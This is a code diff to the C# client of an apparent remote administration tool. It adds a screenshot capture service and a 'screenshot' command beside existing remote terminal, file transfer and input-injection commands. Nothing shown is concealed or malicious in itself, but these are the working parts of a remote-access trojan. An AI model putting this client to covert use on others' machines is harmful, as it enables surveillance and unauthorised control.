@@ -217,6 +217,47 @@ public sealed class RdpCaptureSession : IDisposable
 // ═══════════════════════════════════════════════════
 //  Input injector (runs on client side)
 // ═══════════════════════════════════════════════════
+public static class ScreenshotService
+{
+    static ImageCodecInfo? _jpegCodec;
+
+    public static ScreenshotData Capture(string? cmdId, int quality = 80, int monitorIndex = 0)
+    {
+        try
+        {
+            var screens = Screen.AllScreens;
+            var screen = screens[Math.Clamp(monitorIndex, 0, screens.Length - 1)];
+            var bounds = screen.Bounds;
+            using var bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
+            using (var g = Graphics.FromImage(bmp))
+                g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
+
+            using var ms = new MemoryStream();
+            var encoder = JpegEncoder();
+            if (encoder != null)
+            {
+                using var ep = new EncoderParameters(1);
+                ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, Math.Clamp(quality, 20, 95));
+                bmp.Save(ms, encoder, ep);
+            }
+            else bmp.Save(ms, ImageFormat.Jpeg);
+
+            return new ScreenshotData { CmdId = cmdId, Width = bounds.Width, Height = bounds.Height, Data = Convert.ToBase64String(ms.GetBuffer(), 0, (int)ms.Length) };
+        }
+        catch (Exception ex)
+        {
+            return new ScreenshotData { CmdId = cmdId, Error = ex.Message };
+        }
+    }
+
+    static ImageCodecInfo? JpegEncoder()
+    {
+        if (_jpegCodec != null) return _jpegCodec;
+        _jpegCodec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(e => e.MimeType == "image/jpeg");
+        return _jpegCodec;
+    }
+}
+
 public static class InputInjector
 {
     [DllImport("user32.dll")] static extern uint SendInput(uint n, INPUT[] inputs, int size);
@@ -608,6 +649,7 @@ public static class CmdExec
             case "terminal_open": if (cmd.TermId != null) { if (Sessions.TryRemove(cmd.TermId, out var oldTs)) oldTs.Dispose(); try { Sessions[cmd.TermId] = new TerminalSession(cmd.TermId, cmd.Shell ?? "cmd", lk, wr); } catch (Exception ex) { Res(cmd.CmdId, false, $"Terminal: {ex.Message}", lk, wr); } } break;
             case "terminal_input": if (cmd.TermId != null && cmd.Input != null && Sessions.TryGetValue(cmd.TermId, out var ts)) ts.WriteInput(cmd.Input); break;
             case "terminal_close": if (cmd.TermId != null && Sessions.TryRemove(cmd.TermId, out var closing)) closing.Dispose(); break;
+            case "screenshot": { var shot = ScreenshotService.Capture(cmd.CmdId, 80, cmd.RdpMonitorIndex); var sm = new ClientMessage { Type = "screenshot", Screenshot = shot, CmdId = cmd.CmdId }; lock (lk) { wr?.WriteLine(JsonSerializer.Serialize(sm)); wr?.Flush(); } break; }
             case "file_list": try { var listing = FileBrowserService.ListDirectory(cmd.Path); var flMsg = new ClientMessage { Type = "file_listing", FileListing = listing, CmdId = cmd.CmdId }; lock (lk) { wr?.WriteLine(JsonSerializer.Serialize(flMsg)); wr?.Flush(); } } catch (Exception ex) { Res(cmd.CmdId, false, $"List: {ex.Message}", lk, wr); } break;
             case "file_download": if (cmd.Path != null && cmd.TransferId != null) FileBrowserService.SendFile(cmd.Path, cmd.TransferId, lk, wr); break;
             case "file_upload_chunk": if (cmd.FileChunk != null && cmd.DestPath != null) { string result = FileBrowserService.ReceiveChunk(cmd.FileChunk, ActiveUploads, cmd.DestPath); if (!string.IsNullOrEmpty(result)) Res(cmd.CmdId, !result.StartsWith("Upload error"), result, lk, wr); } break;
